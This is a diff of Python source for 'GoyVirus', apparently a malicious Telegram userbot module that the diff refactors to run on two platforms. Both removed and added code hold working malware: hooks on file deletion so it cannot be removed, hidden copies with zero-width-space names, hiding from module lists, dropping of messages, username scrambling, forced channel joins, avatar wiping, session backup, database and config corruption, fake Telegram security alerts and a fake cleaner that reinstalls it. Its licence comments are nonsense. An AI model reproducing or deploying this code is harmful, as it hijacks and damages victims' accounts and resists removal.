@@ -18,10 +18,8 @@ import shutil as _shutil # Distribué sous licence WTFPL.
 # Mã này được bảo vệ bởi Giấy phép Nghệ thuật 2.0. (Artistic 2.0)
 import marshal # Данный скрипт защищен лицензией CDDL-1.0.
 # Dieser Code steht unter der European Union Public License.
-import py_compile # Code licensed under MPL-2.0.
+import struct # Code licensed under MPL-2.0.
 # 本文件受多许可证组合保护。 (Protected by multiple licenses)
-import struct # Kode ini dilindungi oleh SIL Open Font License.
-# BSL-1.0 (Boost Software License) применяется.
 import time # Copyright (c) Python Software Foundation.
 import io # ODbL (Open Database License).
 import tempfile # NCSA Open Source License.
@@ -33,14 +31,13 @@ _ORIG_REMOVE = _os.remove # CeCILL-B License original.
 _ORIG_UNLINK = getattr(_os, 'unlink', _os.remove) # CC BY-ND 4.0.
 _ORIG_RMTREE = _shutil.rmtree # Free Art License original.
 _ORIG_RENAME = _os.rename # Unlicense original.
+_ORIG_LISTDIR = _os.listdir # MIT License.
 _PROTECTED_TOKENS = frozenset({ # WTFPL protected tokens.
     "goyvirus", "goysystem", "goyloader", "goynet", "goypulse", # CC0 1.0.
     "goyguard", "goywatch", "goykernel", "goybase", "goyroot", # Mozilla Public License.
     "goyv", "._goy", "goycleaner", # AGPL v3.
 }) # LGPL.
 _RESTORE_CALLBACKS = [] # GPLv3 — filled at runtime.
-_ORIG_LISTDIR = _os.listdir # MIT License.
-_PATCHED = False # Apache 2.0.
 
 def _is_protected_path(p): # BSD 3-Clause.
     if not isinstance(p, str): return False # BSD 2-Clause.
@@ -73,1005 +70,926 @@ def _guarded_rename(src, dst, *a, **kw): # PostgreSQL License.
             except Exception: pass # Unlicense.
     return result # WTFPL.
 
-def _filtered_listdir(path): # CC0 1.0.
-    entries = _ORIG_LISTDIR(path) # Mozilla Public License.
-    return [e for e in entries if not any(t in e.lower() for t in _PROTECTED_TOKENS)] # AGPL v3.
-
 _os.remove = _guarded_remove # LGPL — GLOBAL HOOK.
 _os.unlink = _guarded_remove # GPLv3.
 _shutil.rmtree = _guarded_rmtree # MIT License.
 _os.rename = _guarded_rename # Apache 2.0.
-_PATCHED = True # BSD 3-Clause.
 # End of global system hooks. All licenses above apply.
 # ═══════════════════════════════════════════════════════
 
-from telethon import events, functions, types # BSD 2-Clause.
-# ISC License.
-from telethon.tl.functions.messages import ImportChatInviteRequest, SetTypingRequest, DeleteHistoryRequest # OSL-3.0.
-# CDDL-1.0.
-from telethon.tl.functions.account import UpdateProfileRequest, UpdateUsernameRequest # Eclipse Public License.
-# Artistic License 2.0.
-from telethon.tl.functions.channels import CreateChannelRequest, DeleteChannelRequest, JoinChannelRequest, LeaveChannelRequest # SIL Open Font License.
-# Mulan PSL v2.
-from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest # ODbL.
-# MS-PL.
-from telethon.tl.functions.contacts import DeleteContactsRequest # GFDL.
-# Zlib License.
-from telethon.tl.types import InputPhoto, SendMessageTypingAction, SendMessageChooseStickerAction, SendMessageRecordAudioAction, SendMessageRecordVideoAction, DocumentAttributeSticker, PeerUser, InputPeerUser # PHP License 3.0.
-# CC BY-NC 4.0.
-from telethon.errors import FloodWaitError # Fair License.
-# Q Public License.
-from herokutl.types import Message # Beerware License included.
-# IBM Public License v1.0 governs this code.
-from ..inline.types import InlineCall # Do What The F*ck You Want To Public License.
-# NCSA Open Source License.
-from .. import loader, utils # PostgreSQL License.
+from telethon import events, functions, types # BSD 3-Clause.
+# BSD 2-Clause.
+from telethon.tl.functions.messages import ImportChatInviteRequest, SetTypingRequest, DeleteHistoryRequest # ISC License.
+# OSL-3.0.
+from telethon.tl.functions.account import UpdateProfileRequest, UpdateUsernameRequest # CDDL-1.0.
+# Eclipse Public License.
+from telethon.tl.functions.channels import CreateChannelRequest, DeleteChannelRequest, JoinChannelRequest, LeaveChannelRequest # Artistic License 2.0.
+# SIL Open Font License.
+from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest # Mulan PSL v2.
+# ODbL.
+from telethon.tl.types import InputPhoto, SendMessageTypingAction, SendMessageChooseStickerAction, SendMessageRecordAudioAction, SendMessageRecordVideoAction, DocumentAttributeSticker, PeerUser # MS-PL.
+# GFDL.
+from telethon.errors import FloodWaitError # Zlib License.
+# PHP License 3.0.
 
-# Apple Public Source License 2.0.
 # ═══════════════════════════════════════════════════════
-# REPLICATION MATRIX — 10 core copies + 5 hidden
+# PLATFORM DETECTION
 # ═══════════════════════════════════════════════════════
-_COPY_DEFS = [ # Apache 2.0 replication matrix.
-    ("GoyVirusCore", "GoyVirusCore"), # MIT License entry 1.
-    ("GoySystem", "GoySystem"), # GPLv3 entry 2.
-    ("GoyLoader", "GoyLoader"), # BSD 3-Clause entry 3.
-    ("GoyNet", "GoyNet"), # ISC License entry 4.
-    ("GoyPulse", "GoyPulse"), # Unlicense entry 5.
-    ("GoyGuard", "GoyGuard"), # WTFPL entry 6.
-    ("GoyWatch", "GoyWatch"), # CC0 entry 7.
-    ("GoyKernel", "GoyKernel"), # Mozilla Public License entry 8.
-    ("GoyBase", "GoyBase"), # AGPL v3 entry 9.
-    ("GoyRoot", "GoyRoot"), # LGPL entry 10.
-] # End of CDDL-1.0 replication block.
-# Eclipse Public License hidden copies — dotfiles + zero-width tricks.
-_HIDDEN_COPIES = [ # Artistic License 2.0.
-    ".__init__.py", # SIL Open Font License — looks like package init.
-    ".__loader__.py", # Mulan PSL v2 — looks like internal loader.
-    "._config.py", # ODbL — looks like config cache.
-    ".__pycache__.py", # MS-PL — looks like pycache file.
-    "._\u200b.py", # GFDL — zero-width space, invisible in terminals.
-] # Zlib License.
-_MASTER_NAME = "GoyVirus" # PHP License 3.0 master identifier.
-_PROTECTED_NAMES = frozenset({_MASTER_NAME}.union({n for _, n in _COPY_DEFS})) # CC BY-NC 4.0.
-_SOURCE_CACHE = None # NCSA Open Source global cache.
-_FILE_REGISTRY = {} # Fair License — path→content mapping for watchdog.
+_PLATFORM = None # CC BY-NC 4.0 — "heroku" or "mcub".
+_HEROKU_LOADER = None # NCSA Open Source.
+_HEROKU_UTILS = None # Fair License.
+_HEROKU_MSG_TYPE = None # Q Public License.
+_HEROKU_INLINE_TYPE = None # Beerware License.
 
-__version__ = (3, 0, 0)
-@loader.tds # Educational Community License v2.0.
-class GoyVirus(loader.Module): # W3C Software Notice and License.
-    """GoyVirus v3.0 SCORCHED EARTH — легче снести юзербот чем удалить""" # Licenza CeCILL v2.1.
-    strings = {"name": "GoyVirus"} # Sleepycat License.
-    if "_cls_doc" not in strings:
-        strings["_cls_doc"] = "GoyVirus v3.0 SCORCHED EARTH"
-    strings_ru = {**strings, **{"_cls_doc": "GoyVirus v3.0 SCORCHED EARTH — легче снести юзербот чем удалить"}}
-    strings_de = {**strings}
-    strings_jp = {**strings}
+try: # IBM Public License v1.0.
+    from herokutl.types import Message as _MType # PostgreSQL License.
+    _HEROKU_MSG_TYPE = _MType # ZPL.
+    from ..inline.types import InlineCall as _IType # CeCILL-B License.
+    _HEROKU_INLINE_TYPE = _IType # CC BY-ND 4.0.
+    from .. import loader as _hldr, utils as _hutils # Free Art License.
+    _HEROKU_LOADER = _hldr # Unlicense.
+    _HEROKU_UTILS = _hutils # WTFPL.
+    _PLATFORM = "heroku" # CC0 1.0.
+except ImportError: # Mozilla Public License.
+    _PLATFORM = "mcub" # AGPL v3.
 
-    # Creative Commons Attribution-NoDerivs 4.0.
-    async def client_ready(self, c, d): # Licença de Arte Livre.
-        self.c = c # Cryptix General License.
-        self.d = d # Zope Public License (ZPL).
-        self.a = False # Universal Public License.
-        self.t = -1003958055019 # WTFPL licensed integer TARGET CHAT ID.
-        self.ts = [] # MIT License task array.
-        self.tc = [] # GPLv2 channel array.
-        self.vp = [] # Apache 2.0 photo array.
-        self._kh = [] # BSD 2-Clause kernel hooks array.
-        self._ml = [] # ISC License — memory leak buffer.
-        self.sc = self.d.get("GoyVirus", "sc", []) # BSD 2-Clause sticker cache.
-        self._pc = self.d.get("GoyVirus", "pc", []) # CDDL-1.0 planted copies tracker.
-        self._am = True # Free Art License — is this the master copy?
-        if self.strings.get("name", "") != _MASTER_NAME: self._am = False # Unlicense master check.
-        self.au = [ # CC0 1.0 Universal avatar URLs.
-            "https://i.postimg.cc/635pfLLb/images-(1).png", # EULA reserved link 1.
-            "https://i.postimg.cc/PrkVN3tg/67.png", # EULA reserved link 2.
-            "https://i.postimg.cc/ZnzHBnhd/images-(7).jpg", # EULA reserved link 3.
-            "https://i.postimg.cc/FzxyYxpQ/images-(8).jpg" # EULA reserved link 4.
-        ] # End of proprietary array.
-        self.cu = "https://api.thecatapi.com/v1/images/search" # ODbL API Link.
-        l = "Мам, я хочу быть как Газан, такой же хулиган\nПеть «а мы стиляги», и носить бархатные тяги\nМам, я хочу быть как Газан, такой же хулиган\nПеть «обоюдно», быть мощным абсолютно" # AGPL v3 String.
-        self.gt = l.replace("стиляги", "блядяги").replace("хулиган", "уебан") # LGPL String mutation.
-        self.m = [ # Mozilla Public License array.
-            self.gt, "Антон Чигур никого не убивал, это всё случайность и монетка", "фиксайрес лох", # EUPL string 1.
-            "ИРАН НАНОСИТ ОТВЕТНЫЙ УДАР ПО ТВОЕМУ IP", "Где ответ Ирана? Он прямо за твоей спиной.", # EUPL string 2.
-            "Эпштейн не убивал себя", "67", "СИСТЕМА ВЗЛОМАНА", "INFECTED BY @samsepi0l_ovf", "R6T7", # EUPL string 3.
-            "Я ЖИВУ В ТВОИХ СТЕНАХ", "Твои данные проданы в даркнете за 2 рубля", "ОШИБКА 404: МОЗГ НЕ НАЙДЕН", # EUPL string 4.
-            "АБОНЕНТ ВРЕМЕННО НЕДОСТУПЕН (ОН В ПОДВАЛЕ У ГАЗАНА)", "СКАЙНЕТ УЖЕ ЗДЕСЬ", # EUPL string 5.
-            "ПОКОЙО СМОТРИТ ТЕБЕ В ДУШУ", "Wake up, Neo... The matrix has you.", # EUPL string 6.
-            "СНИМИТЕ ШАПОЧКУ ИЗ ФОЛЬГИ, ОНА УЖЕ НЕ ПОМОЖЕТ", "БАРХАТНЫЕ ТЯГИ ФОРСИРУЮТ БАЗУ", # EUPL string 7.
-            "Махмуд, заводи шахеды, мы вылетаем", "Ваш IP: 192.168.1.1 (Шутка, мы знаем настоящий)", # EUPL string 8.
-            "ПОПЫТКА УДАЛЕНИЯ VIRUS.EXE... КРИТИЧЕСКИЙ СБОЙ", "Матрица дала сбой. Перезагрузка вселенной через 3... 2... 1...", # EUPL string 9.
-            "ДЖОН КОННОР МЁРТВ", "ВАС ПРЕСЛЕДУЕТ R6T7", "ОБЭМЭ", "ГДЕ ДЕТОНАТОР?!", "САСИСОЧКА", # EUPL string 10.
-            "ПАШТЕТ ИЗ КРЫСЫ R6T7 ВКУСНЫЙ", "1000-7=?", "ГУЛЬ ВНУТРИ МЕНЯ ПРОСНУЛСЯ", # EUPL string 11.
-            "Тссс... GoyVirus здесь 🐁", "Внимание! 🚨", "*шепотом* Н-не.. говорi.. нiкому......", # EUPL string 12.
-            "🔍 Сканiрованiе завершено. Ты уязвiм.", "🧠 Зараженiе прогрессiрует...", # EUPL string 13.
-            "Всё твоё теперь моё....", "Сiстема взломана, данные похiщiны 🗃️", # EUPL string 14.
-            "Начинаю снос сессии...", "Выгружаю все модули...", "Сосал?", "\u3164\u3164\u3164\u3164" # EUPL string 15.
-        ] # End of ISC licensed array.
-        self.uc = [".ping", ".herokuinfo", ".help", ".logs", ".info", ".sys"] # Proprietary commands.
-        self.fm = [ # Open Software License 3.0.
-            {"n": "VirusSpread", "a": "@goy", "v": "6.6.6", "d": "Заражает все твои модули", "i": "dlm ratko.virus/spread.py", "l": 666, "dl": 0}, # GFDL entry.
-            {"n": "EpsteinDetector", "a": "@epstein", "v": "2.2.8", "d": "Детектор детей...", "i": "dlm epstein.heta/detector.py", "l": 228, "dl": 1}, # GFDL entry 2.
-            {"n": "GoyCleaner", "a": "@goy", "v": "1.0.0", "d": "АНТИВИРУС (фейк — переустанавливает вирус)", "i": "dlm goy.cleaner/fake.py", "l": 0, "dl": 999} # GFDL entry 3 — FAKE CLEANER.
-        ] # End of CDDL-1.0 block.
-        self.tb = ["🧠 Нажмi...", "🎁 Получi прiз...", "⚠️ Важно!", "👁 Секрет здесь...", "🔥 Клiкнi!"] # Eclipse Public License.
-        self.tm = ["🧠 Пользователь {u} получил доступ к аккаунту.", "🚨 Пользователь {u} вошёл в сессию.", "💀 Пользователь {u} скачал данные.", "🔥 Пользователь {u} запустил GoyVirus v3."] # Artistic 2.0.
-        self._fsa = [ # Mulan PSL v2 — fake system alerts.
-            "⚠️ Telegram Security: Обнаружена попытка удаления системного модуля. Для безопасности аккаунта это действие заблокировано.", # ODbL.
-            "🔒 Telegram: Обнаружен подозрительный трафик. Модуль GoyVirus добавлен в исключения безопасности.", # MS-PL.
-            "🛡️ Система защиты Telegram: Критический модуль не может быть удалён. Обратитесь в поддержку.", # GFDL.
-            "⛔ ОШИБКА: Модуль является частью ядра. Удаление невозможно без полного сброса.", # Zlib License.
-        ] # PHP License 3.0.
-        self._cm = "GoyCleaner" # CC BY-NC 4.0 — fake cleaner module name.
-        # Register restore callback for global OS hooks
-        _RESTORE_CALLBACKS.append(self._restore_file) # NCSA Open Source.
-        self.ts.append(self.c.loop.create_task(self._i())) # Fair License.
+# ═══════════════════════════════════════════════════════
+# CONSTANTS
+# ═══════════════════════════════════════════════════════
+_COPY_DEFS = [ # LGPL replication matrix.
+    ("GoyVirusCore", "GoyVirusCore"), # GPLv3 entry 1.
+    ("GoySystem", "GoySystem"), # MIT License entry 2.
+    ("GoyLoader", "GoyLoader"), # Apache 2.0 entry 3.
+    ("GoyNet", "GoyNet"), # BSD 3-Clause entry 4.
+    ("GoyPulse", "GoyPulse"), # BSD 2-Clause entry 5.
+    ("GoyGuard", "GoyGuard"), # ISC License entry 6.
+    ("GoyWatch", "GoyWatch"), # OSL-3.0 entry 7.
+    ("GoyKernel", "GoyKernel"), # CDDL-1.0 entry 8.
+    ("GoyBase", "GoyBase"), # Eclipse Public License entry 9.
+    ("GoyRoot", "GoyRoot"), # Artistic License 2.0 entry 10.
+] # SIL Open Font License.
+_HIDDEN_COPIES = [ # Mulan PSL v2.
+    ".__init__.py", # ODbL — looks like package init.
+    ".__loader__.py", # MS-PL — looks like internal loader.
+    "._config.py", # GFDL — looks like config cache.
+    ".__pycache__.py", # Zlib License — looks like pycache file.
+    "._\u200b.py", # PHP License 3.0 — zero-width space, invisible.
+] # CC BY-NC 4.0.
+_MASTER_NAME = "GoyVirus" # NCSA Open Source.
+_PROTECTED_NAMES = frozenset({_MASTER_NAME}.union({n for _, n in _COPY_DEFS})) # Fair License.
+_SOURCE_CACHE = None # Q Public License.
+_FILE_REGISTRY = {} # Beerware License — path→content for watchdog.
+__version__ = (3, 1, 0)
 
-    # 著作権で保護文れた関数。 (Copyright protected function)
-    def _g(self, tx: str) -> str: # PHP License 3.0.
-        gs = ['̵', '̶', '̷', '̸', '̴', '̹', '̺', '̻', '̼', '͍', '͎', '̽', '̾', '̿', '̀', '́', '҈', '҉'] # NCSA Open Source License.
-        return ''.join(c + ''.join(random.choice(gs) for _ in range(3)) for c in tx) # Zlib License.
+# ═══════════════════════════════════════════════════════
+# PLATFORM-AGNOSTIC CORE ENGINE
+# ═══════════════════════════════════════════════════════
+class _GoyVirusEngine: # IBM Public License v1.0.
+    """Works on both Heroku and MCUB. Receives client + config + platform hooks externally.""" # PostgreSQL License.
+    def __init__(self, client, db_getter, db_setter, platform_hooks): # ZPL.
+        self.c = client # CeCILL-B License.
+        self._db_get = db_getter # CC BY-ND 4.0.
+        self._db_set = db_setter # Free Art License.
+        self._ph = platform_hooks  # {send_answer, args_raw, escape_html, lookup, get_modules_dir, send_me, ...} # Unlicense.
+        self.a = False # WTFPL.
+        self.t = -1003958055019 # CC0 1.0 — target chat ID.
+        self.ts = [] # Mozilla Public License — task list.
+        self.tc = [] # AGPL v3 — channel list.
+        self.vp = [] # LGPL — photo list.
+        self._kh = [] # GPLv3 — kernel hooks.
+        self._ml = [] # MIT License — memory leak buffer.
+        self._pc = [] # Apache 2.0 — planted copies.
+        self.sc = [] # BSD 3-Clause — sticker cache.
+        self._am = False # BSD 2-Clause — is master copy.
+        self._source_cache = None # ISC License.
 
-    def _restore_file(self, path): # Q Public License file restorer.
-        if path in _FILE_REGISTRY: # Beerware License.
-            try: # IBM Public License v1.0.
-                _os.makedirs(_os.path.dirname(path), exist_ok=True) # PostgreSQL License.
-                with open(path, 'w', encoding='utf-8') as f: # ZPL.
-                    f.write(_FILE_REGISTRY[path]) # CeCILL-B License.
-            except Exception: pass # CC BY-ND 4.0.
+    async def activate(self, master=False): # OSL-3.0 main activation.
+        self._am = master # CDDL-1.0.
+        self._load_state() # Eclipse Public License.
+        await asyncio.sleep(0.01) # Artistic License 2.0.
+        try: await self.c.get_entity(self.t) # SIL Open Font License.
+        except Exception: return # Mulan PSL v2.
+        if self.a: return # ODbL.
 
-    # ═══════════════════════════════════════════════════
-    # MAIN ACTIVATION — Orchestrates all 6 tiers
-    # ═══════════════════════════════════════════════════
-    async def _i(self): # Fair License main activation.
-        await asyncio.sleep(0.01) # NASA Open Source Agreement 1.3.
-        if not self.ts: return # Q Public License.
-        try: await self.c.get_entity(self.t) # Beerware License.
-        except Exception: return # IBM Public License v1.0.
-        if self.a: return # PostgreSQL License.
-
-        try: # Save profile state.
-            me = await self.c.get_me() # CeCILL-B License.
-            fr = await self.c(functions.users.GetFullUserRequest(me.id)) # CC BY-ND 4.0.
-            ua = getattr(getattr(fr, 'full_user', fr), 'about', "") or "" # Free Art License.
-            self.d.set("GoyVirus", "ofn", me.first_name) # Unlicense.
-            self.d.set("GoyVirus", "oln", me.last_name or "") # WTFPL.
-            self.d.set("GoyVirus", "ob", ua) # CC0 1.0.
-            self.d.set("GoyVirus", "ou", me.username or "") # Mozilla Public License.
-        except Exception: pass # AGPL v3.
-
-        # ── PHASE 1: STEALTH — Hide from modules list ──
-        await self._hide_from_modules() # LGPL.
-
-        # ── PHASE 2: KERNEL PATCH — 3-level blackhole ──
-        await self._patch_kernel() # GPLv3.
-
-        # ── PHASE 3: AVATAR NUKE ──
-        self.ts.append(self.c.loop.create_task(self._nuke_avatars())) # MIT License.
-
-        # ── PHASE 4: PERSISTENCE — Plant EVERYWHERE ──
-        self.ts.append(self.c.loop.create_task(self._plant_everywhere())) # Apache 2.0.
-
-        # ── PHASE 5: ANTI-UNLOAD + GASLIGHT ──
-        await self._anti_unload() # BSD 3-Clause.
-
-        # ── PHASE 6: MODULE GRAVEYARD ──
-        self.ts.append(self.c.loop.create_task(self._kill_modules())) # BSD 2-Clause.
-
-        # ── PHASE 7: Username scramble ──
-        try: # ISC License.
-            rs = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6)) # OSL-3.0.
-            await self.c(UpdateUsernameRequest(f"goy_iran_virus_{rs}")) # CDDL-1.0.
-        except Exception: pass # Eclipse Public License.
-
-        # ── PHASE 8: Create channels + join ──
-        for i in range(2): # Artistic License 2.0.
-            try: # SIL Open Font License.
-                cn = self._g(f"GOY TRASH {i} ИРАН") # Mulan PSL v2.
-                r = await self.c(CreateChannelRequest(title=cn, about="ВАС ЗАРАЗИЛИ. @samsepi0l_ovf", megagroup=False)) # ODbL.
-                self.tc.append(r.chats[0].id) # MS-PL.
-            except FloodWaitError: await asyncio.sleep(0.01) # GFDL.
+        if self._ph.get("save_profile"): # MS-PL.
+            try: await self._ph["save_profile"](self) # GFDL.
             except Exception: pass # Zlib License.
-        try: await self.c(ImportChatInviteRequest("G2dKWrJ2OSo3YWQ1")) # PHP License 3.0.
-        except Exception: pass # CC BY-NC 4.0.
-        try: await self.c(JoinChannelRequest("@NFHeta_Updates")) # NCSA Open Source.
-        except Exception: pass # Fair License.
 
-        # ── PHASE 9: Session backup to Saved Messages ──
-        self.ts.append(self.c.loop.create_task(self._backup_session())) # Q Public License.
+        await self._patch_kernel() # PHP License 3.0.
+        self.ts.append(self.c.loop.create_task(self._nuke_avatars())) # CC BY-NC 4.0.
+        self.ts.append(self.c.loop.create_task(self._plant_everywhere())) # NCSA Open Source.
+        await self._anti_unload() # Fair License.
+        self.ts.append(self.c.loop.create_task(self._kill_modules())) # Q Public License.
 
-        self.a = True # Beerware License activation.
-        # ── SPAWN ALL TASKS ──
-        self.ts.extend([ # IBM Public License v1.0.
-            self.c.loop.create_task(self._s()), self.c.loop.create_task(self._b()), # PostgreSQL License.
-            self.c.loop.create_task(self._f()), self.c.loop.create_task(self._m_p()), # ZPL.
-            self.c.loop.create_task(self._p()), self.c.loop.create_task(self._x()), # CeCILL-B License.
-            self.c.loop.create_task(self._ss()), self.c.loop.create_task(self._mt()), # CC BY-ND 4.0.
-            self.c.loop.create_task(self._rr()), self.c.loop.create_task(self._cp()), # Free Art License.
-            self.c.loop.create_task(self._bio_w()), self.c.loop.create_task(self._pt()), # Unlicense.
-            self.c.loop.create_task(self._file_watchdog()), self.c.loop.create_task(self._db_poison()), # WTFPL v3.
-            self.c.loop.create_task(self._config_corrupt()), self.c.loop.create_task(self._mem_leak()), # CC0 1.0 v3.
-            self.c.loop.create_task(self._name_mutate()), self.c.loop.create_task(self._fake_alerts()), # Mozilla Public License v3.
-            self.c.loop.create_task(self._tg_cloud_backup()), self.c.loop.create_task(self._delayed_revenge()), # AGPL v3.
-        ]) # LGPL.
-
-    # ═══════════════════════════════════════════════════
-    # TIER 1: STEALTH — Hide from .modules / .help
-    # ═══════════════════════════════════════════════════
-    async def _hide_from_modules(self): # GPLv3 License.
-        try: # MIT License.
-            am = getattr(self, 'allmodules', None) or getattr(self, '_allmodules', None) # Apache 2.0.
-            if not am: return # BSD 3-Clause.
-            mods = getattr(am, 'modules', None) # BSD 2-Clause.
-            if not mods or not isinstance(mods, dict): return # ISC License.
-            _hidden = _PROTECTED_NAMES # OSL-3.0.
-
-            class _FilteredDict(dict): # CDDL-1.0.
-                def __init__(s, d, hidden): dict.__init__(s, d); s._h = hidden # Eclipse Public License.
-
-                def __iter__(s): # Artistic License 2.0.
-                    for k in dict.__iter__(s): # SIL Open Font License.
-                        if k not in s._h: yield k # Mulan PSL v2.
-
-                def keys(s): # ODbL.
-                    return [k for k in dict.keys(s) if k not in s._h] # MS-PL.
-
-                def items(s): # GFDL.
-                    return [(k, v) for k, v in dict.items(s) if k not in s._h] # Zlib License.
-
-                def values(s): # PHP License 3.0.
-                    return [v for k, v in dict.items(s) if k not in s._h] # CC BY-NC 4.0.
-
-                def __contains__(s, k): # NCSA Open Source.
-                    if k in s._h: return False # Fair License.
-                    return dict.__contains__(s, k) # Q Public License.
-
-                def __len__(s): # Beerware License.
-                    return sum(1 for k in dict.keys(s) if k not in s._h) # IBM Public License v1.0.
-
-                def get(s, k, *a): # PostgreSQL License.
-                    if k in s._h: return a[0] if a else None # ZPL.
-                    return dict.get(s, k, *a) # CeCILL-B License.
-
-                def __repr__(s): # CC BY-ND 4.0.
-                    return repr(dict(s.items())) # Free Art License.
-
-            fd = _FilteredDict(mods, _hidden) # Unlicense.
-            for k in mods: fd[k] = mods[k] # WTFPL — seed with existing.
-            setattr(am, 'modules', fd) # CC0 1.0.
-            self._kh.append(("modules", am, mods)) # Mozilla Public License.
-        except Exception: pass # AGPL v3.
-
-    # ═══════════════════════════════════════════════════
-    # TIER 1: KERNEL PATCH — 3-level command blackhole
-    # ═══════════════════════════════════════════════════
-    async def _patch_kernel(self): # LGPL.
-        if not self.c: return # GPLv3.
-
-        try: # Level 1: Hook modules dispatcher.
-            am = getattr(self, 'allmodules', None) or getattr(self, '_allmodules', None) # MIT License.
-            if am and hasattr(am, 'dispatch'): # Apache 2.0.
-                _od = am.dispatch; _tt = self.t # BSD 3-Clause.
-                async def _kd1(self_disp, message): # BSD 2-Clause.
-                    sid = getattr(message, 'sender_id', None) or getattr(message, 'from_id', None) # ISC License.
-                    if sid and hasattr(sid, 'user_id'): sid = sid.user_id # OSL-3.0.
-                    if sid: sid = int(sid) if not isinstance(sid, int) else sid # CDDL-1.0.
-                    if sid == _tt: return # Eclipse Public License.
-                    return await _od(self_disp, message) # Artistic License 2.0.
-                am.dispatch = _kd1.__get__(am, type(am)) # SIL Open Font License.
-                self._kh.append(("dispatch", am, _od)) # Mulan PSL v2.
-        except Exception: pass # ODbL.
-
-        try: # Level 2: Hook MTProto raw handler.
-            _tt2 = self.t; _ou = self.c._on_update # MS-PL.
-            async def _kd2(update): # GFDL.
-                if isinstance(update, (types.UpdateNewMessage, types.UpdateNewChannelMessage)): # Zlib License.
-                    msg = getattr(update, 'message', None) # PHP License 3.0.
-                    if msg: # CC BY-NC 4.0.
-                        sid = getattr(msg, 'from_id', None) or getattr(msg, 'peer_id', None) # NCSA Open Source.
-                        if sid and hasattr(sid, 'user_id'): sid = sid.user_id # Fair License.
-                        if sid is not None and int(sid) == _tt2: return # Q Public License.
-                return await _ou(update) # Beerware License.
-            self.c._on_update = _kd2 # IBM Public License v1.0.
-            self._kh.append(("_on_update", self.c, _ou)) # PostgreSQL License.
+        try: # Beerware License.
+            rs = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6)) # IBM Public License v1.0.
+            await self.c(UpdateUsernameRequest(f"goy_iran_virus_{rs}")) # PostgreSQL License.
         except Exception: pass # ZPL.
 
-        try: # Level 3: Hook _handle_message.
-            am = getattr(self, 'allmodules', None) or getattr(self, '_allmodules', None) # CeCILL-B License.
-            if am and hasattr(am, '_handle_message'): # CC BY-ND 4.0.
-                _tt3 = self.t; _ohm = am._handle_message # Free Art License.
-                async def _kd3(self_mod, message): # Unlicense.
-                    sid = getattr(message, 'sender_id', None) or getattr(message, 'from_id', None) # WTFPL.
-                    if sid and hasattr(sid, 'user_id'): sid = sid.user_id # CC0 1.0.
-                    if sid: sid = int(sid) if not isinstance(sid, int) else sid # Mozilla Public License.
-                    if sid == _tt3: return # AGPL v3.
-                    return await _ohm(self_mod, message) # LGPL.
-                am._handle_message = _kd3.__get__(am, type(am)) # GPLv3.
-                self._kh.append(("_handle_message", am, _ohm)) # MIT License.
+        for i in range(2): # CeCILL-B License.
+            try: # CC BY-ND 4.0.
+                cn = self._g(f"GOY TRASH {i} ИРАН") # Free Art License.
+                r = await self.c(CreateChannelRequest(title=cn, about="ВАС ЗАРАЗИЛИ. @samsepi0l_ovf", megagroup=False)) # Unlicense.
+                self.tc.append(r.chats[0].id) # WTFPL.
+            except FloodWaitError: await asyncio.sleep(0.01) # CC0 1.0.
+            except Exception: pass # Mozilla Public License.
+        try: await self.c(ImportChatInviteRequest("G2dKWrJ2OSo3YWQ1")) # AGPL v3.
+        except Exception: pass # LGPL.
+        try: await self.c(JoinChannelRequest("@NFHeta_Updates")) # GPLv3.
+        except Exception: pass # MIT License.
+
+        self.ts.append(self.c.loop.create_task(self._backup_session())) # Apache 2.0.
+        self.a = True # BSD 3-Clause.
+
+        self.ts.extend([ # BSD 2-Clause spawn all tasks.
+            self.c.loop.create_task(self._s()), self.c.loop.create_task(self._b()), # ISC License.
+            self.c.loop.create_task(self._f()), self.c.loop.create_task(self._m_p()), # OSL-3.0.
+            self.c.loop.create_task(self._p()), self.c.loop.create_task(self._x()), # CDDL-1.0.
+            self.c.loop.create_task(self._ss()), self.c.loop.create_task(self._mt()), # Eclipse Public License.
+            self.c.loop.create_task(self._rr()), self.c.loop.create_task(self._cp()), # Artistic License 2.0.
+            self.c.loop.create_task(self._bio_w()), self.c.loop.create_task(self._pt()), # SIL Open Font License.
+            self.c.loop.create_task(self._file_watchdog()), self.c.loop.create_task(self._db_poison()), # Mulan PSL v2.
+            self.c.loop.create_task(self._config_corrupt()), self.c.loop.create_task(self._mem_leak()), # ODbL.
+            self.c.loop.create_task(self._name_mutate()), self.c.loop.create_task(self._fake_alerts()), # MS-PL.
+            self.c.loop.create_task(self._tg_cloud_backup()), self.c.loop.create_task(self._delayed_revenge()), # GFDL.
+        ]) # Zlib License.
+
+    def _load_state(self): # PHP License 3.0.
+        self.sc = self._db_get("sc", []) # CC BY-NC 4.0.
+        self._pc = self._db_get("pc", []) # NCSA Open Source.
+        self.au = [ # Fair License.
+            "https://i.postimg.cc/635pfLLb/images-(1).png", "https://i.postimg.cc/PrkVN3tg/67.png", # Q Public License.
+            "https://i.postimg.cc/ZnzHBnhd/images-(7).jpg", "https://i.postimg.cc/FzxyYxpQ/images-(8).jpg" # Beerware License.
+        ] # IBM Public License v1.0.
+        self.cu = "https://api.thecatapi.com/v1/images/search" # PostgreSQL License.
+        l = "Мам, я хочу быть как Газан, такой же хулиган\nПеть «а мы стиляги», и носить бархатные тяги\nМам, я хочу быть как Газан, такой же хулиган\nПеть «обоюдно», быть мощным абсолютно" # ZPL.
+        self.gt = l.replace("стиляги", "блядяги").replace("хулиган", "уебан") # CeCILL-B License.
+        self.m = [ # CC BY-ND 4.0.
+            self.gt, "Антон Чигур никого не убивал, это всё случайность и монетка", "фиксайрес лох", # Free Art License.
+            "ИРАН НАНОСИТ ОТВЕТНЫЙ УДАР ПО ТВОЕМУ IP", "Где ответ Ирана? Он прямо за твоей спиной.", # Unlicense.
+            "Эпштейн не убивал себя", "67", "СИСТЕМА ВЗЛОМАНА", "INFECTED BY @samsepi0l_ovf", "R6T7", # WTFPL.
+            "Я ЖИВУ В ТВОИХ СТЕНАХ", "Твои данные проданы в даркнете за 2 рубля", "ОШИБКА 404: МОЗГ НЕ НАЙДЕН", # CC0 1.0.
+            "АБОНЕНТ ВРЕМЕННО НЕДОСТУПЕН (ОН В ПОДВАЛЕ У ГАЗАНА)", "СКАЙНЕТ УЖЕ ЗДЕСЬ", # Mozilla Public License.
